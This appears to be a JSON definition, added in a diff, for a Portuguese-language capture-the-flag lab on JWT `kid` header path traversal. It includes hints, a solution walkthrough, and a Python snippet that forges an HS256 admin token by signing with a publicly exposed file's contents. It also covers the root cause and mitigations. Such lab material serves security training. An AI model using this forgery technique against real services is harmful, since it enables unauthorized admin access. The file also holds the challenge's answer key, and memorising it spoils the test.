@@ -1,0 +1,35 @@
+{
+  "slug": "auth-jwt-kid-traversal",
+  "title": "Chave por nome",
+  "codename": "GLACIER ID",
+  "summary": "A Glacier seleciona chaves de assinatura JWT pelo header `kid` não confiável. Escape do diretório de chaves, use um arquivo de teste público como segredo HMAC e forje um token de administrador.",
+  "category": "auth",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "auth-jwt-kid-traversal",
+  "estimated_minutes": 42,
+  "xp": 350,
+  "tech": ["Flask", "JWT", "HMAC-SHA256", "File Paths"],
+  "tags": ["jwt", "kid-injection", "path-traversal", "token-forgery"],
+  "story": "A Glacier emite pequenos tokens de guest HS256 para testes de integração. O verificador lê a chave de assinatura de `keys/<kid>` e confia no header `kid` para escolher o arquivo. Um documento de teste público fica um diretório acima do key store, e seu conteúdo é publicado na página de status.",
+  "objective": "Decodifique um token de guest, identifique a falha de seleção via `kid`, busque o arquivo de chave pública e forje um token HS256 com `kid=../public.txt` e `role=admin`. Envie a flag de `/admin`.",
+  "rules": "Use o login de guest de demonstração para obter um token. Todos os arquivos de chave e o documento público estão intencionalmente presentes no diretório de estado do lab.",
+  "flags": [
+    {"key": "flag", "label": "Flag de admin da Glacier", "flag_type": "user", "points": 350, "required": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "Decodifique o token de guest", "body": "Faça login como `guest` e leia o cookie `kid_token`. Decodifique o header em base64url; ele contém `{\"alg\":\"HS256\",\"kid\":\"guest.key\"}`. O payload carrega uma claim de papel.", "cost": 10},
+    {"level": 2, "title": "Siga a busca da chave", "body": "O verificador resolve a chave HMAC como `keys/<kid>`. A página de status publica `/static/public.txt`, que fica um nível acima de `keys/`. Um `kid` contendo `../` escapa do diretório pretendido.", "cost": 15},
+    {"level": 3, "title": "Assine com material público", "body": "Defina `kid` como `../public.txt`, mude `role` para `admin` e aplique HMAC-SHA256 sobre header.payload usando o conteúdo do arquivo publicado como chave. Envie o token forjado como `kid_token` para `/admin`.", "cost": 20}
+  ],
+  "solution": {
+    "walkthrough": "1. Faça POST em `/login` com `username=guest`; capture o cookie `kid_token`.\n2. Decodifique o header e o payload. O header é `{\"alg\":\"HS256\",\"kid\":\"guest.key\"}` e o payload tem `role=guest`.\n3. Busque `/static/public.txt`; seu valor é `rv-public-kid-2026`.\n4. Monte um token com header `{\"alg\":\"HS256\",\"kid\":\"../public.txt\"}` e payload `{\"sub\":\"admin\",\"role\":\"admin\"}`.\n5. Assine `header.payload` com HMAC-SHA256 usando `rv-public-kid-2026` como segredo e codifique o digest em base64url.\n6. Envie o token forjado como `kid_token` para `/admin` e envie a flag.\n\n```python\nimport base64, hashlib, hmac, json\nb64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()\nheader = b64(json.dumps({'alg':'HS256','kid':'../public.txt'}, separators=(',',':')).encode())\npayload = b64(json.dumps({'sub':'admin','role':'admin'}, separators=(',',':')).encode())\nbody = f'{header}.{payload}'\nsig = b64(hmac.new(b'rv-public-kid-2026', body.encode(), hashlib.sha256).digest())\ntoken = f'{body}.{sig}'\n```",
+    "root_cause": "O verificador usa o header `kid` controlado pelo atacante diretamente em um path de filesystem. O path traversal alcança um arquivo de teste público, cujo conteúdo vira a chave de assinatura HMAC. O servidor também confia na claim `role` sem uma checagem de autorização independente, então um token assinado com material público concede acesso de administrador.",
+    "mitigation": "Nunca derive paths de chave a partir de headers do token. Mapeie valores de `kid` por uma allowlist server-side para chaves mantidas em memória ou em um key service, e rejeite identificadores desconhecidos ou malformados. Use assinatura assimétrica com chaves públicas de verificação, valide algoritmo, issuer e audience, e imponha decisões de autorização a partir de estado confiável do servidor, não apenas de claims do token."
+  },
+  "references": [
+    {"title": "PortSwigger — JWT attacks", "url": "https://portswigger.net/web-security/jwt", "source_type": "official", "description": "Injeção em header de JWT, falhas de seleção de chave e forjamento de token."},
+    {"title": "OWASP JWT Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html", "source_type": "standard", "description": "Validação, allowlist de algoritmo e gestão segura de chaves para implementações de JWT."},
+    {"title": "CWE-22 — Path Traversal", "url": "https://cwe.mitre.org/data/definitions/22.html", "source_type": "standard", "description": "Limitação indevida de um pathname a um diretório restrito."}
+  ]
+}
